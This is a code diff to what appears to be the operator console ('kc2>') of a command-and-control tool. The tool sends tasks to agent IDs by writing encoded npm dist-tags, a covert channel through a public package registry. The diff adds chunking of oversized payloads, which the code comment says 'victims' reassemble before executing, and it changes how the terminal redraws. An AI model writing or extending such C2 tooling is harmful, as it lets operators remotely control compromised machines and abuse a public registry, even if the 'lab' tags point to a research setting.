@@ -18,6 +18,7 @@
 //   exit                        save state and quit
 
 import readline from 'node:readline/promises';
+import { clearScreenDown, cursorTo, moveCursor } from 'node:readline';
 import fs from 'node:fs';
 import path from 'node:path';
 import { styleText } from 'node:util';
@@ -28,9 +29,9 @@ import {
   PINNED_VERSION,
   MAX_TAG_LEN,
   decodeAnnounceTag,
-  decodeCommandTag,
+  decodeCommandHeader,
   decodeResultTag,
-  encodeCommandTag,
+  encodeCommandTags,
   isAnnounceTag,
   isCommandTag,
   isLabTag,
@@ -45,6 +46,7 @@ import {
   createSingleFlight,
   formatLiveNotification,
   formatResultBody,
+  inputBlockGeometry,
   pendingDirectTasks,
   sanitizeRegistryText,
 } from './text.js';
@@ -53,6 +55,7 @@ import {
 export {
   createSingleFlight,
   formatLiveNotification,
+  inputBlockGeometry,
   pendingDirectTasks,
   sanitizeRegistryText,
 } from './text.js';
@@ -78,6 +81,8 @@ const c = (color, s) => (tty ? styleText(color, s) : s);
 const section = (s) => c(['bold', 'yellow'], s);
 const cmdName = (s) => c(['bold', 'white'], s);
 const dim = (s) => c('dim', s);
+
+const PROMPT_TEXT = 'kc2> '; // visible width matters for multi-row redraws
 
 const HISTORY_MAX = 200; // persisted entries, capped so the state file stays small
 const HISTORY_OUTPUT_MAX = 300; // chars of a result output kept in history
@@ -181,12 +186,27 @@ async function main() {
   const rl = readline.createInterface({
     input: process.stdin,
     output: process.stdout,
-    prompt: c('blue', 'kc2> '),
+    prompt: c('blue', PROMPT_TEXT),
   });
 
-  /** Print a live notification without eating the line the user is typing. */
+  /** Print a live notification without mangling the line the user is typing. */
   function notify(line, redraw = true) {
-    console.log(formatLiveNotification(line, redraw && tty));
+    if (redraw && tty && !rlClosed) {
+      // Erase the WHOLE input block, not just the cursor row: a long
+      // command wraps onto several rows, and clearing only the cursor row
+      // (the old behavior) left stray kc2> fragments inside the input.
+      const { cursorRow } = inputBlockGeometry(rl.line.length, rl.cursor ?? rl.line.length, {
+        promptWidth: PROMPT_TEXT.length,
+        columns: process.stdout.columns,
+      });
+      cursorTo(process.stdout, 0);
+      if (cursorRow > 0) moveCursor(process.stdout, 0, -cursorRow);
+      clearScreenDown(process.stdout);
+      console.log(line);
+      rl.prompt(true);
+      return;
+    }
+    console.log(formatLiveNotification(line, false));
     if (redraw && !rlClosed) rl.prompt(true);
   }
 
@@ -257,7 +277,7 @@ async function main() {
     for (const name of Object.keys(tags)) {
       if (isCommandTag(name)) {
         try {
-          const cmd = decodeCommandTag(name);
+          const cmd = decodeCommandHeader(name);
           state.nextSeq[cmd.agentId] = Math.max(state.nextSeq[cmd.agentId] ?? 0, cmd.seq);
         } catch (err) {
           logger.warn(`skipping malformed command tag "${name}": ${err.message}`);
@@ -339,14 +359,23 @@ async function main() {
     const seq = Math.max(0, ...Object.values(state.nextSeq)) + 1;
     const sentAt = Date.now();
     const payload = { op, args, ts: sentAt };
-    const tag = encodeCommandTag(target, seq, payload);
-    await client.setDistTag(tag, PINNED_VERSION);
+    // Oversized payloads are split into <chunk>of<total> command tags;
+    // victims buffer the parts and execute only once every chunk is visible.
+    const tags = encodeCommandTags(target, seq, payload);
+    for (const tag of tags) {
+      await client.setDistTag(tag, PINNED_VERSION);
+    }
     state.nextSeq[target] = seq;
     state.sent++;
-    pushHistory(state, { dir: 'out', ts: sentAt, target, seq, op, args, tag });
+    pushHistory(state, { dir: 'out', ts: sentAt, target, seq, op, args, tag: tags[0], chunks: tags.length });
     save();
-    console.log(`[${ts()}] ${c('green', 'sent:')} task ${c('bold', `#${seq}`)} ${op} -> ${target} (tag ${tag.length}/${MAX_TAG_LEN} chars)`);
-    console.log(c('dim', `  ${tag}`));
+    const detail =
+      tags.length === 1
+        ? `tag ${tags[0].length}/${MAX_TAG_LEN} chars`
+        : `${tags.length} chunk tags of <=${MAX_TAG_LEN} chars`;
+    console.log(`[${ts()}] ${c('green', 'sent:')} task ${c('bold', `#${seq}`)} ${op} -> ${target} (${detail})`);
+    console.log(c('dim', `  ${tags[0]}`));
+    if (tags.length > 1) console.log(c('dim', `  … +${tags.length - 1} more chunk tag(s)`));
   }
 
   // --- help rendering -------------------------------------------------------
